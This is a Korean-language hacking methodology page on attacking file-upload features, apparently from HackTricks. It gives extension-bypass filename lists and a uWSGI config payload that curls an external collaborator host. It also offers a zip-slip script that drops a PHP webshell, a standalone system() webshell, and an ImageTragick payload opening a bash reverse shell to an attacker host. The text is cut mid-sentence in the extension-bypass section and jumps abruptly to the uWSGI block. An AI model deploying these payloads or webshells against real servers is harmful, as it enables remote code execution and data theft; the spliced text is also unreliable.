# 파일 업로드

{{#include ../../banners/hacktricks-training.md}}


## 파일 업로드 일반 방법론

기타 유용한 확장자:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **PHPv8에서 작업하기**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws 웹 서버**: _.yaws_

### 파일 확장자 검사 우회

1. 적용되는 경우, **이전 확장자**를 **확인**합니다. 또한 **대문자**를 사용하여 테스트합니다: _pHp, .pHP5, .PhAr ..._
2. _실행 확장자 앞에 **유효한 확장자 추가** 확인 (이전 확장자도 사용):_
- _file.png.php_
- _file.png.Php5_
3. **특수 문자를 끝에 추가**해 보십시오. Burp를 사용하여 모든 **ascii** 및 **Unicode** 문자를 **브루트포스**할 수 있습니다. (_이전의 **확장자**를 사용하여 더 나은 페이로드를 준비할 수도 있습니다._)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. **서버 측의 확장자 파서를 속여** 보호를 우회해 보십시오. **확장자**를 **두 번** 추가하거나 **쓰레기** 데이터 (**null** 바이트)를 확장자 사이에 추가하는 기술을 사용할 수 있습니다. _이전의 **확장자
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
페이로드의 실행은 구성 파일의 구문 분석 중에 발생합니다. 구성이 활성화되고 구문 분석되기 위해서는 uWSGI 프로세스를 재시작해야 하며(충돌 후 또는 서비스 거부 공격으로 인해) 파일이 자동으로 다시 로드되도록 설정되어야 합니다. 자동 다시 로드 기능이 활성화된 경우, 변경 사항을 감지하면 지정된 간격으로 파일을 다시 로드합니다.

uWSGI의 구성 파일 구문 분석의 느슨한 특성을 이해하는 것이 중요합니다. 특히, 논의된 페이로드는 이진 파일(예: 이미지 또는 PDF)에 삽입될 수 있어 잠재적인 악용 범위를 더욱 넓힙니다.

## **wget 파일 업로드/SSRF 트릭**

일부 경우, 서버가 **`wget`**을 사용하여 **파일을 다운로드**하고 **URL**을 **지정**할 수 있는 경우가 있습니다. 이러한 경우, 코드는 다운로드된 파일의 확장자가 화이트리스트에 있는지 확인하여 허용된 파일만 다운로드되도록 보장할 수 있습니다. 그러나 **이 검사는 우회할 수 있습니다.**\
**리눅스**에서 **파일 이름**의 **최대** 길이는 **255**자이지만, **wget**은 파일 이름을 **236**자로 잘라냅니다. **"A"\*232+".php"+".gif"**라는 파일을 **다운로드**할 수 있으며, 이 파일 이름은 **검사**를 **우회**합니다(이 예에서 **".gif"**는 **유효한** 확장자입니다) 하지만 `wget`은 파일 이름을 **"A"\*232+".php"**로 **변경**합니다.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
**다른 옵션**으로 이 검사를 우회하기 위해 생각할 수 있는 것은 **HTTP 서버가 다른 파일로 리디렉션**되도록 하는 것입니다. 이렇게 하면 초기 URL이 검사를 우회하고 wget이 새 이름으로 리디렉션된 파일을 다운로드하게 됩니다. 이는 **wget이 `--trust-server-names` 매개변수와 함께 사용되지 않는 한 작동하지 않습니다**. 왜냐하면 **wget은 원래 URL에 표시된 파일 이름으로 리디렉션된 페이지를 다운로드하기 때문입니다**.

## 도구

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass)는 Pentesters와 Bug Hunters가 파일 업로드 메커니즘을 테스트하는 데 도움을 주기 위해 설계된 강력한 도구입니다. 다양한 버그 바운티 기법을 활용하여 취약점을 식별하고 악용하는 과정을 단순화하여 웹 애플리케이션에 대한 철저한 평가를 보장합니다.

## 파일 업로드에서 다른 취약점으로

- **filename**을 `../../../tmp/lol.png`로 설정하고 **경로 탐색**을 시도합니다.
- **filename**을 `sleep(10)-- -.jpg`로 설정하면 **SQL 인젝션**을 달성할 수 있습니다.
- **filename**을 `<svg onload=alert(document.domain)>`로 설정하여 XSS를 달성합니다.
- **filename**을 `; sleep 10;`으로 설정하여 일부 명령 주입을 테스트합니다 (더 많은 [명령 주입 트릭은 여기](../command-injection.md)에서 확인하세요).
- [**XSS** 이미지 (svg) 파일 업로드](../xss-cross-site-scripting/#xss-uploading-files-svg)
- **JS** 파일 **업로드** + **XSS** = [**서비스 워커** 악용](../xss-cross-site-scripting/#xss-abusing-service-workers)
- [**SVG 업로드에서 XXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**SVG 파일 업로드를 통한 오픈 리디렉션**](../open-redirect.md#open-redirect-uploading-svg-files)
- [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)에서 **다양한 svg 페이로드**를 시도해 보세요.
- [유명한 **ImageTrick** 취약점](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- **웹 서버에 URL에서 이미지를 가져오도록 지시할 수 있다면**, [SSRF](../ssrf-server-side-request-forgery/)를 악용할 수 있습니다. 이 **이미지**가 어떤 **공개** 사이트에 **저장**될 경우, [https://iplogger.org/invisible/](https://iplogger.org/invisible/)의 URL을 지정하여 **모든 방문자의 정보를 훔칠** 수 있습니다.
- [PDF-Adobe 업로드로 **XXE 및 CORS** 우회](pdf-upload-xxe-and-cors-bypass.md)
- XSS를 위한 특별히 제작된 PDF: [다음 페이지는 **PDF 데이터를 주입하여 JS 실행을 얻는 방법**을 제시합니다](../xss-cross-site-scripting/pdf-injection.md). PDF를 업로드할 수 있다면, 주어진 지침에 따라 임의의 JS를 실행할 PDF를 준비할 수 있습니다.
- \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) 콘텐츠를 업로드하여 서버에 **안티바이러스**가 있는지 확인합니다.
- 파일 업로드 시 **크기 제한**이 있는지 확인합니다.

여기 파일 업로드를 통해 달성할 수 있는 10가지 목록이 있습니다 (출처: [여기](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: 웹쉘 / RCE
2. **SVG**: 저장된 XSS / SSRF / XXE
3. **GIF**: 저장된 XSS / SSRF
4. **CSV**: CSV 인젝션
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS**: HTML 인젝션 / XSS / 오픈 리디렉션
8. **PNG / JPEG**: 픽셀 플러드 공격 (DoS)
9. **ZIP**: LFI를 통한 RCE / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp 확장

{% embed url="https://github.com/portswigger/upload-scanner" %}

## 매직 헤더 바이트

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

다른 파일 형식에 대한 정보는 [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)를 참조하세요.

### Zip/Tar 파일 자동 압축 해제 업로드

서버 내에서 압축 해제될 ZIP 파일을 업로드할 수 있다면, 두 가지 작업을 수행할 수 있습니다:

#### 심볼릭 링크

다른 파일에 대한 소프트 링크를 포함하는 링크를 업로드한 다음, 압축 해제된 파일에 접근하여 링크된 파일에 접근할 수 있습니다:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 다른 폴더에 압축 해제

압축 해제 중 디렉토리에서 파일이 예기치 않게 생성되는 것은 중요한 문제입니다. 이 설정이 악성 파일 업로드를 통한 OS 수준의 명령 실행을 방지할 것이라는 초기 가정에도 불구하고, ZIP 아카이브 형식의 계층적 압축 지원 및 디렉토리 탐색 기능이 악용될 수 있습니다. 이를 통해 공격자는 제한을 우회하고 대상 애플리케이션의 압축 해제 기능을 조작하여 안전한 업로드 디렉토리를 탈출할 수 있습니다.

이러한 파일을 생성하기 위한 자동화된 익스플로잇은 [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)에서 사용할 수 있습니다. 유틸리티는 다음과 같이 사용할 수 있습니다:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
추가적으로, **evilarc와 함께하는 symlink 트릭**은 옵션입니다. 목표가 `/flag.txt`와 같은 파일을 타겟으로 하는 경우, 해당 파일에 대한 symlink를 시스템에 생성해야 합니다. 이는 evilarc가 작동 중 오류를 겪지 않도록 보장합니다.

아래는 악성 zip 파일을 생성하는 데 사용되는 Python 코드의 예입니다:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**압축을 악용한 파일 스프레이**

자세한 내용은 **원본 게시물을 확인하세요**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **PHP 셸 생성**: PHP 코드는 `$_REQUEST` 변수를 통해 전달된 명령을 실행하도록 작성됩니다.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **파일 스프레이 및 압축 파일 생성**: 여러 파일이 생성되고 이 파일들을 포함하는 zip 아카이브가 조립됩니다.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Hex 편집기 또는 vi로 수정**: zip 내부의 파일 이름을 vi 또는 hex 편집기를 사용하여 변경하여 "xxA"를 "../"로 변경하여 디렉토리를 탐색합니다.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

이 콘텐츠를 이미지 확장자로 업로드하여 취약점을 악용하세요 **(ImageMagick , 7.0.1-1)** (form the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG에 PHP 셸 삽입

PNG 파일의 IDAT 청크에 PHP 셸을 삽입하면 특정 이미지 처리 작업을 효과적으로 우회할 수 있습니다. PHP-GD의 `imagecopyresized` 및 `imagecopyresampled` 함수는 각각 이미지를 크기 조정하고 재샘플링하는 데 일반적으로 사용되므로 이 맥락에서 특히 관련이 있습니다. 삽입된 PHP 셸이 이러한 작업의 영향을 받지 않는 능력은 특정 사용 사례에 있어 중요한 장점입니다.

이 기술에 대한 자세한 탐구, 방법론 및 잠재적 응용 프로그램은 다음 기사에서 제공됩니다: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). 이 자료는 프로세스와 그 의미에 대한 포괄적인 이해를 제공합니다.

자세한 정보는: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## 폴리글롯 파일

폴리글롯 파일은 사이버 보안에서 독특한 도구로 작용하며, 여러 파일 형식에서 동시에 유효하게 존재할 수 있는 카멜레온과 같습니다. 흥미로운 예로는 GIF와 RAR 아카이브로 기능하는 하이브리드인 [GIFAR](https://en.wikipedia.org/wiki/Gifar)가 있습니다. 이러한 파일은 이 조합에 국한되지 않으며, GIF와 JS 또는 PPT와 JS와 같은 조합도 가능합니다.

폴리글롯 파일의 핵심 유용성은 파일 유형에 따라 파일을 검사하는 보안 조치를 우회할 수 있는 능력에 있습니다. 다양한 애플리케이션에서 일반적인 관행은 JPEG, GIF 또는 DOC와 같은 특정 파일 유형만 업로드를 허용하여 잠재적으로 해로운 형식(예: JS, PHP 또는 Phar 파일)으로 인한 위험을 완화하는 것입니다. 그러나 폴리글롯은 여러 파일 유형의 구조적 기준을 준수함으로써 이러한 제한을 은밀하게 우회할 수 있습니다.

그들의 적응성에도 불구하고, 폴리글롯은 한계에 직면합니다. 예를 들어, 폴리글롯이 PHAR 파일(PHp ARchive)과 JPEG를 동시에 포함할 수 있지만, 업로드의 성공 여부는 플랫폼의 파일 확장자 정책에 달려 있을 수 있습니다. 시스템이 허용되는 확장자에 대해 엄격하다면, 폴리글롯의 단순한 구조적 이중성만으로는 업로드를 보장할 수 없습니다.

자세한 정보는: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## 참고 문헌

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)


{{#include ../../banners/hacktricks-training.md}}
